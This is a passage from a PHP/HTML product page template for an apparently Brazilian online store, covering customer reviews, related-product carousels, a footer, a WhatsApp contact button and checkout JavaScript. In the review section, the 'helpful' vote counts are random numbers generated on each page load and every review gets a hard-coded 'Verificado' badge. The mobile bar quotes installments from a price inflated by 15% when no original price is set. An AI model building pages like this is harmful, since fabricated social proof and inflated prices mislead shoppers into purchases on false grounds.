              <?php echo mb_strtoupper(mb_substr($nome_rev,0,1,'UTF-8'),'UTF-8'); ?>
            </div>
            <div>
              <div class="font-semibold text-sm flex items-center gap-2">
                <?php echo ($nome_rev === "Cliente Loja Ester") ? "Cliente " . htmlspecialchars($nome) : htmlspecialchars($nome_rev); ?>
                <span class="text-success text-[11px] bg-success/10 px-1.5 py-0.5 rounded-full"><i class="fa-solid fa-check"></i> Verificado</span>
              </div>
              <div class="text-xs text-muted-foreground mb-1"><?php echo htmlspecialchars($data_rev); ?></div>
              <div class="flex text-warning text-[10px]">
                <?php echo str_repeat('<i class="fa-solid fa-star"></i>', $estrelas); ?>
              </div>
            </div>
          </div>
          <h3 class="font-bold text-[15px] mb-2 text-foreground"><?php echo htmlspecialchars($titulo_rev); ?></h3>
          <p class="text-[14px] text-foreground/80 leading-relaxed mb-3"><?php echo htmlspecialchars($texto_rev); ?></p>
          
          <?php if(!empty($fotos_rev)): ?>
          <div class="flex gap-2 mb-3">
            <?php foreach($fotos_rev as $f_rev): ?>
            <img src="<?php echo $f_rev; ?>" alt="Foto da avaliação" class="w-16 h-16 rounded-md object-cover border border-border cursor-pointer hover:opacity-80 transition-opacity">
            <?php endforeach; ?>
          </div>
          <?php endif; ?>
          
          <div class="flex items-center gap-4 text-xs font-semibold text-muted-foreground">
            <button class="flex items-center gap-1.5 hover:text-primary transition-colors"><i class="fa-regular fa-thumbs-up text-sm"></i> Útil (<?php echo rand(10, 150); ?>)</button>
          </div>
        </div>
        <?php endforeach; ?>
      </div>
      <button class="w-full md:w-auto mt-4 px-6 py-2.5 border border-border rounded-lg text-sm font-bold text-primary hover:bg-secondary/50 transition-colors">Ver todas as avaliações</button>
    </div>
  </div>

</main>

<!-- CARROSSEIS INFERIORES -->
<div class="max-w-7xl mx-auto px-4 md:px-4 mb-10">
  
  <!-- Relacionados 1 (Especificos) -->
  <?php if(!empty($produtos_relacionados_especificos)): ?>
  <div class="mt-4 bg-white md:bg-transparent py-6 overflow-hidden md:rounded-lg">
    <h2 class="text-xl font-bold mb-6 text-foreground">Produtos relacionados</h2>
    <div class="flex gap-4 overflow-x-auto pb-4 snap-x snap-proximity scrollbar-hide -mx-4 px-4">
      <?php foreach($produtos_relacionados_especificos as $outro): 
        $outro_valor = (float)str_replace(',', '.', str_replace('.', '', $outro['valor']));
      ?>
      <a href="produto.php?produto=<?php echo $outro['codigo']; ?>" class="flex-none w-[160px] md:w-[220px] snap-start border border-border bg-white rounded-lg overflow-hidden block hover:shadow-lg transition-shadow group">
        <div class="w-full h-[160px] md:h-[220px] p-4 flex items-center justify-center relative">
          <img src="<?php echo $outro['img']; ?>" alt="<?php echo htmlspecialchars($outro['nome']); ?>" class="max-w-full max-h-full object-contain group-hover:scale-105 transition-transform duration-300">
        </div>
        <div class="p-4 border-t border-border">
          <div class="text-sm text-foreground/90 line-clamp-2 h-10 mb-3 leading-snug"><?php echo htmlspecialchars($outro['nome']); ?></div>
          <div class="text-xl md:text-2xl font-bold text-foreground mb-1">R$ <?php echo number_format($outro_valor, 2, ',', '.'); ?></div>
          <div class="text-xs text-success font-semibold mb-3">10x R$ <?php echo number_format($outro_valor / 10, 2, ',', '.'); ?> sem juros</div>
          <div class="text-[10px] text-white bg-primary font-bold px-1.5 py-0.5 rounded inline-flex items-center gap-1"><i class="fa-solid fa-truck-fast"></i> FULL</div>
        </div>
      </a>
      <?php endforeach; ?>
    </div>
  </div>
  <?php endif; ?>

  <!-- Relacionados 2 (Outros produtos - Quem viu tb comprou) -->
  <?php if(!empty($outros_produtos)): ?>
  <div class="mt-4 bg-white md:bg-transparent py-6 overflow-hidden md:rounded-lg">
    <h2 class="text-xl font-bold mb-6 text-foreground">Quem viu este produto também comprou</h2>
    <div class="flex gap-4 overflow-x-auto pb-4 snap-x snap-proximity scrollbar-hide -mx-4 px-4">
      <?php foreach($outros_produtos as $outro): 
        $outro_valor = (float)str_replace(',', '.', str_replace('.', '', $outro['valor']));
      ?>
      <a href="produto.php?produto=<?php echo $outro['codigo']; ?>" class="flex-none w-[160px] md:w-[220px] snap-start border border-border bg-white rounded-lg overflow-hidden block hover:shadow-lg transition-shadow group">
        <div class="w-full h-[160px] md:h-[220px] p-4 flex items-center justify-center relative">
          <img src="<?php echo $outro['img']; ?>" alt="<?php echo htmlspecialchars($outro['nome']); ?>" class="max-w-full max-h-full object-contain group-hover:scale-105 transition-transform duration-300">
        </div>
        <div class="p-4 border-t border-border">
          <div class="text-sm text-foreground/90 line-clamp-2 h-10 mb-3 leading-snug"><?php echo htmlspecialchars($outro['nome']); ?></div>
          <div class="text-xl md:text-2xl font-bold text-foreground mb-1">R$ <?php echo number_format($outro_valor, 2, ',', '.'); ?></div>
          <div class="text-xs text-success font-semibold mb-3">10x R$ <?php echo number_format($outro_valor / 10, 2, ',', '.'); ?> sem juros</div>
          <div class="text-[10px] text-white bg-primary font-bold px-1.5 py-0.5 rounded inline-flex items-center gap-1"><i class="fa-solid fa-truck-fast"></i> FULL</div>
        </div>
      </a>
      <?php endforeach; ?>
    </div>
  </div>
  <?php endif; ?>
</div>

<footer class="bg-[#e5e5e5] text-[#3e3e3e] text-sm mt-6 border-t border-[#d8d8d8]">
  <div class="max-w-7xl mx-auto px-5 py-8 md:py-12">
    <div class="grid grid-cols-2 md:grid-cols-4 gap-y-6 gap-x-8 mb-8 md:mb-12">
      <div class="flex flex-col gap-3">
        <h3 class="font-bold text-base mb-1">Institucional</h3>
        <a href="rastreio.php" class="hover:underline text-[#666]">Meus pedidos</a>
        <a href="#" class="hover:underline text-[#666]">Minha conta</a>
      </div>
      <div class="flex flex-col gap-3">
        <h3 class="font-bold text-base mb-1">Dúvidas</h3>
        <a href="#" class="hover:underline text-[#666]">Atendimento</a>
        <a href="politica-de-privacidade.php" class="hover:underline text-[#666]">Política de Privacidade</a>
        <a href="termos-de-uso.php" class="hover:underline text-[#666]">Termos de Uso</a>
        <a href="trocas-e-devolucoes.php" class="hover:underline text-[#666]">Trocas e Devoluções</a>
      </div>
      <div class="col-span-2 md:col-span-2">
        <div class="bg-white p-6 rounded-xl border border-[#d8d8d8] flex flex-col items-center justify-center text-center">
           <h3 class="font-bold text-lg mb-2">Atendimento Especializado</h3>
           <p class="text-[#666] mb-4">Tem alguma dúvida? Fale com a gente pelo WhatsApp!</p>
           <a href="https://wa.me/<?php echo preg_replace('/[^0-9]/', '', $zap_cotacao); ?>" target="_blank" class="w-full max-w-[250px] flex items-center justify-center gap-2 border-2 border-[#25D366] text-[#25D366] font-bold py-3 rounded-lg hover:bg-[#25D366] hover:text-white transition-colors">
            <i class="fa-brands fa-whatsapp text-lg"></i> Fale com a gente
          </a>
        </div>
      </div>
    </div>
    
    <div class="text-center font-bold mb-6 text-[#666] text-[15px]">
      <p>Televendas: <?php echo htmlspecialchars($zap_cotacao); ?></p>
    </div>
    <div class="border-t border-[#d8d8d8] pt-6 flex flex-col items-center">
      <p class="text-[11px] md:text-xs leading-relaxed text-[#666] text-center max-w-3xl">
        <?php echo htmlspecialchars($nome); ?> - CNPJ: <?php echo htmlspecialchars($cnpj); ?><br>
        <?php echo htmlspecialchars($endereco); ?><br>
        Preços e condições de pagamento exclusivos para compras via internet, podendo variar nas lojas físicas. Ofertas válidas na compra de até 5 peças de cada produto por cliente, até o término dos nossos estoques para internet.<br><br>
        ® <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?> – Todos os direitos reservados.
      </p>
    </div>
  </div>
</footer>

<!-- Sticky Bar Mobile Only -->
<div id="stickyBarMobile" class="md:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-border p-3 flex items-center justify-between z-40 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] sticky-bar pb-5 transition-transform duration-300 translate-y-full">
  <div class="flex flex-col">
    <span class="text-[11px] text-muted-foreground">ou 10x de R$ <?php echo number_format(($valor_original > 0 ? $valor_original : $valor_total * 1.15) / 10, 2, ',', '.'); ?></span>
    <span class="text-xl font-bold leading-none text-foreground mt-0.5">R$ <?php echo number_format($valor_total, 2, ',', '.'); ?></span>
  </div>
  <a href="checkout.php?produto=<?php echo $codigo; ?>" class="btn-comprar bg-success hover:bg-success-dark text-white font-bold py-3 px-6 rounded-lg flex items-center gap-2 text-[15px] shadow-sm transition-transform active:scale-[0.98]">
    <i class="fa-solid fa-bag-shopping"></i> Adicionar à sacola
  </a>
</div>

<?php if($zap_flutuante_ativo == "1" && !empty($zap_cotacao)): ?>
<!-- Botão Flutuante WhatsApp -->
<a id="btnWhatsappFloat" href="https://wa.me/<?php echo preg_replace('/[^0-9]/', '', $zap_cotacao); ?>?text=Olá, tenho interesse no produto <?php echo urlencode($nomeproduto); ?>" target="_blank" style="position:fixed; bottom: 85px; right:15px; background:#25D366; color:white; width:55px; height:55px; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 4px 15px rgba(37,211,102,0.4); z-index:40; transition: transform 0.3s;" class="md:bottom-6 md:right-6 md:w-16 md:h-16 hover:scale-110">
  <i class="fa-brands fa-whatsapp text-3xl md:text-4xl"></i>
</a>
<?php endif; ?>

<div id="store-loading-overlay" style="display: none;">
    <div class="spinner"></div>
    <p style="color: #666; font-size: 15px; font-weight: 600; margin-top: 10px;">Processando seu pedido...</p>
</div>

<script>
	var carouselTrack = document.getElementById('carouselTrack');
	var dots = document.querySelectorAll('.carousel-dot');
	var counter = document.querySelector('.carousel-counter');

	if(carouselTrack) {
	    carouselTrack.addEventListener('scroll', function() {
	        var scrollLeft = carouselTrack.scrollLeft;
	        var width = carouselTrack.offsetWidth;
	        var index = Math.round(scrollLeft / width);
	        
	        dots.forEach(dot => {
              dot.classList.remove('bg-primary', 'active');
              dot.classList.add('bg-muted-foreground/40');
          });
	        if(dots[index]) {
              dots[index].classList.remove('bg-muted-foreground/40');
              dots[index].classList.add('bg-primary', 'active');
          }
	        if(counter) counter.innerText = (index + 1) + '/' + dots.length;
	    });
	}

  // Troca de imagem no Desktop
  function changeMainImage(url, index) {
      const mainImg = document.getElementById('pdpMainImg');
      if (mainImg) mainImg.src = url;
      
      document.querySelectorAll('.pdp-thumb').forEach(t => t.classList.remove('active', 'border-primary'));
      const thumbs = document.querySelectorAll('.pdp-thumb');
      if (thumbs[index]) thumbs[index].classList.add('active', 'border-primary');
  }

	const codigoProduto = <?php echo json_encode($codigo); ?>;
	const nomeProdutoOriginal = <?php echo json_encode($nomeproduto); ?>;
	const precoProdutoFormatado = <?php echo json_encode(number_format($valor_total, 2, ',', '.')); ?>;
	const precoOriginalFormatado = <?php echo json_encode(number_format($valor_original, 2, ',', '.')); ?>;
	const imagemProdutoOriginal = <?php echo json_encode($todas_imgs[0]); ?>;
	let variacoesSelecionadas = {};

  // Pegar variações que já vem marcadas como 'active'
  document.querySelectorAll('.active[data-tipo]').forEach(function(el) {
      variacoesSelecionadas[el.getAttribute('data-tipo')] = el.getAttribute('data-valor');
  });

	function salvarEstadoCheckout() {
	    const dadosCarrinho = {
	        produto: codigoProduto,
	        quantos: 1,
	        precoFinal: precoProdutoFormatado,
	        precoUnitario: precoProdutoFormatado,
            precoOriginal: precoOriginalFormatado
	    };
	    localStorage.setItem('lojavirtual', JSON.stringify(dadosCarrinho));
	    localStorage.setItem('variacoes_selecionadas', JSON.stringify(variacoesSelecionadas));
	    atualizarLinksCheckout();
	}

	function atualizarLinksCheckout() {
	    const params = new URLSearchParams({ produto: codigoProduto });
	    Object.entries(variacoesSelecionadas).forEach(([chave, valor]) => {
	        if (!valor || ['titulo_selecionado', 'imagem_selecionada', 'titulo', 'img'].includes(chave)) return;
	        params.set(chave, valor);
	    });
	    const hrefCheckout = 'checkout.php?' + params.toString();
        document.querySelectorAll('.btn-comprar').forEach(btn => {
            btn.setAttribute('href', hrefCheckout);
        });
	}

  function aplicarImagemVariacao(img) {
      if (!img) return;
      const primeiraImagem = document.querySelector('.main-img-first');
      if (primeiraImagem) {
          primeiraImagem.setAttribute('src', img);
      }
      const desktopMainImg = document.getElementById('pdpMainImg');
      if (desktopMainImg) {
          desktopMainImg.setAttribute('src', img);
      }
  }

	function toggleDescricao() {
	    const texto = document.getElementById('descricaoTexto');
	    const gradient = document.getElementById('descricaoGradient');
	    const btn = document.getElementById('btnVerMais');
	    if (texto.classList.contains('max-h-[250px]') || texto.classList.contains('md:max-h-[400px]')) {
	        texto.classList.remove('max-h-[250px]', 'md:max-h-[400px]');
          texto.classList.add('max-h-[2000px]', 'md:max-h-[2000px]');
	        btn.innerHTML = 'Ver menos <i class="fa-solid fa-chevron-up"></i>';
          if(gradient) gradient.style.display = 'none';
	    } else {
	        texto.classList.remove('max-h-[2000px]', 'md:max-h-[2000px]');
          texto.classList.add('max-h-[250px]', 'md:max-h-[400px]');
	        btn.innerHTML = 'Ver descrição completa <i class="fa-solid fa-chevron-down"></i>';
          if(gradient) gradient.style.display = 'block';
	        texto.scrollIntoView({ behavior: 'smooth', block: 'start' });
	    }
	}

	$(document).ready(function() {
	    $('.btn-variacao-texto, .btn-variacao-cor').on('click', function() {
	        const tipo = $(this).data('tipo');
	        const valor = $(this).data('valor');
	        const botao = this;

	        $(`[data-tipo="${tipo}"]`).removeClass('active border-primary text-primary bg-primary/5 hover:border-foreground/30').addClass('border-border text-foreground hover:border-foreground/30');
	        $(this).removeClass('border-border text-foreground hover:border-foreground/30').addClass('active border-primary');
          if($(this).hasClass('btn-variacao-texto')) {
              $(this).addClass('text-primary bg-primary/5').removeClass('hover:border-foreground/30');
          }

	        variacoesSelecionadas[tipo] = valor;
	        
	        if (tipo === 'cor') {
	            $('#label-cor').text(valor);
	            const titulo = String($(botao).data('titulo-variacao') || nomeProdutoOriginal).trim();
	            const img = String($(botao).data('img-variacao') || imagemProdutoOriginal).trim();
	            variacoesSelecionadas.titulo_selecionado = titulo || nomeProdutoOriginal;
	            variacoesSelecionadas.imagem_selecionada = img || imagemProdutoOriginal;
		        $('#produtoTitulo').text(variacoesSelecionadas.titulo_selecionado);
            if($('#produtoTituloDesktop').length) {
                $('#produtoTituloDesktop').text(variacoesSelecionadas.titulo_selecionado);
            }

		        aplicarImagemVariacao(variacoesSelecionadas.imagem_selecionada);
	        }
	        if (tipo === 'voltagem') $('#label-voltagem').text(valor);
	        if (tipo === 'armazenamento') $('#label-armazenamento').text(valor);
	        if (tipo === 'tamanho') $('#label-tamanho').text(valor);

	        salvarEstadoCheckout();
	    });
	    
	    salvarEstadoCheckout();
	});

	function showLoading(e) {
	    document.getElementById('store-loading-overlay').style.display = 'flex';
	}

	window.addEventListener('load', function() {
	    if (document.getElementById('store-loading-overlay')) {
	        document.getElementById('store-loading-overlay').style.display = 'none';
	    }
	});

	document.querySelectorAll('.btn-comprar').forEach(btn => {
	    btn.addEventListener('click', showLoading);
	});

	// Lógica para mostrar a Sticky Bar e esconder o botão do WhatsApp
	const btnMainSacola = document.getElementById('btnMainSacola');
	const stickyBarMobile = document.getElementById('stickyBarMobile');
	const btnWhatsapp = document.getElementById('btnWhatsappFloat');
	
	if (btnMainSacola && stickyBarMobile) {
	    const observer = new IntersectionObserver((entries) => {
	        entries.forEach(entry => {
	            // Se o botão principal saiu da tela e o scroll desceu além dele
	            if (!entry.isIntersecting && entry.boundingClientRect.top < 0) {
	                stickyBarMobile.classList.remove('translate-y-full');
	                if (btnWhatsapp && window.innerWidth < 768) {
                      btnWhatsapp.style.transform = 'scale(0)';
                  }
	            } else {
	                stickyBarMobile.classList.add('translate-y-full');
	                if (btnWhatsapp) {
                      btnWhatsapp.style.transform = 'scale(1)';
                  }
	            }
	        });
	    }, { threshold: 0 });
	    
	    observer.observe(btnMainSacola);
	}
</script>

</body>
</html>
